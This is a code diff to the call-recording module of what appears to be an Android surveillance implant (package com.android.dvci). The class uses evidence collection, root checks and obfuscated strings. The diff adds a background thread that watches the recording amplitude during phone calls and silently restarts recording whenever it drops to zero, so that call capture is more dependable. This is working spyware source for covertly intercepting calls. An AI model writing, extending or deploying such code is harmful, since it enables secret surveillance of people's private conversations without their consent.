@@ -24,6 +24,7 @@ import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
 import com.android.dvci.file.AutoFile;
 import com.android.dvci.interfaces.Observer;
+import com.android.dvci.listener.BroadcastMonitorCall;
 import com.android.dvci.listener.ListenerCall;
 import com.android.dvci.manager.ManagerModule;
 
@@ -54,6 +55,7 @@ import java.util.Collections;
 import java.util.Comparator;
 import java.util.Date;
 import java.util.List;
+import java.util.Timer;
 import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.LinkedBlockingQueue;
 
@@ -97,6 +99,8 @@ public class ModuleCall extends BaseModule   {
 	private boolean canRecord = false;
 	private boolean isStarted = false;
 	private Object recordingLock = new Object();
+	private CallMonitor callMonitor= null;
+	private Thread monitor = null;
 
 	public static ModuleCall self() {
 		return (ModuleCall) ManagerModule.self().get(M.e("call"));
@@ -188,6 +192,11 @@ public class ModuleCall extends BaseModule   {
 			}
 		}
 		isStarted=true;
+		if(recordFlag && monitor==null) {
+			callMonitor = new CallMonitor();
+			monitor = new Thread(callMonitor);
+			monitor.start();
+		}
 	}
 
 	private boolean installedWhitelist() {
@@ -219,10 +228,56 @@ public class ModuleCall extends BaseModule   {
 
 	}
 
+	class CallMonitor implements Runnable {
+
+
+		public CallMonitor() {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(CallMonitor): starting ");
+			}
+		}
+
+
+		@Override
+		public void run() {
+			if (recordFlag) {
+				while (true) {
+
+					if (!isStarted) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "(CallMonitor run): closing monitor thread");
+						}
+						return;
+					}
+
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (CallMonitor): CallIsOnGoing=" + RecordCall.self().isRecording()); //$NON-NLS-1$
+					}
+					if (RecordCall.self().isRecording()) {
+						int ampl = RecordCall.self().getMaxAmplitude();
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (CallMonitor): check amplitude=" + ampl); //$NON-NLS-1$
+						}
+						if (ampl == 0) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (CallMonitor): something wrong restart it"); //$NON-NLS-1$
+							}
+							BroadcastMonitorCall.stopRecordCall();
+							Utils.sleep(500);
+							BroadcastMonitorCall.startRecordCall();
+						}
+					}
+
+					Utils.sleep(1000);
+				}
+			}
+		}
+	}
+
 	@Override
 	public void actualStop() {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (actualStop");
+			Check.log(TAG + " (actualStop)");
 		}
 		if (Status.haveRoot()) {
 			if (queueMonitor != null && queueMonitor.isAlive()) {
@@ -243,6 +298,19 @@ public class ModuleCall extends BaseModule   {
 			}
 		}
 		canRecord = false;
+		isStarted = false;
+		if(monitor!=null) {
+			Utils.sleep(1000);
+			try {
+				monitor.join(1000);
+			} catch (InterruptedException e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (actualStop) interrupted while joining monitor call");
+				}
+				monitor.interrupt();
+			}
+			monitor = null;
+		}
 	}
 
 	private void startWatchAudio() {
